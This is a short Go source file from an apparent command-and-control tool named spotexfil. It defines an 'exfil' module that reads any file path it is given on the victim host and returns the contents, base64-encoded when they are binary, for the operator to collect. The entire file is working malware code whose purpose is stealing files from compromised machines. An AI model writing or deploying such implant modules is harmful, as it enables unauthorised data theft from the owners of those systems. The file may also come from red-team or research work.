package c2

import (
	"encoding/base64"
	"fmt"
	"os"
	"unicode/utf8"

	"github.com/sourcefrenchy/spotexfil/internal/shared"
)

// ExfilModule reads files and returns their contents.
type ExfilModule struct{}

func (m *ExfilModule) Name() string { return "exfil" }

func (m *ExfilModule) Execute(args map[string]interface{}) (string, string) {
	path, _ := args["path"].(string)
	if path == "" {
		return "error", "Empty path"
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return "error", err.Error()
	}

	maxSize := shared.Proto.C2.MaxResultSize
	if len(content) > maxSize {
		return "error", fmt.Sprintf("File too large: %d bytes (max %d)", len(content), maxSize)
	}

	// Try text first, fall back to base64 for binary
	if utf8.Valid(content) {
		return "ok", string(content)
	}
	return "ok", "b64:" + base64.StdEncoding.EncodeToString(content)
}
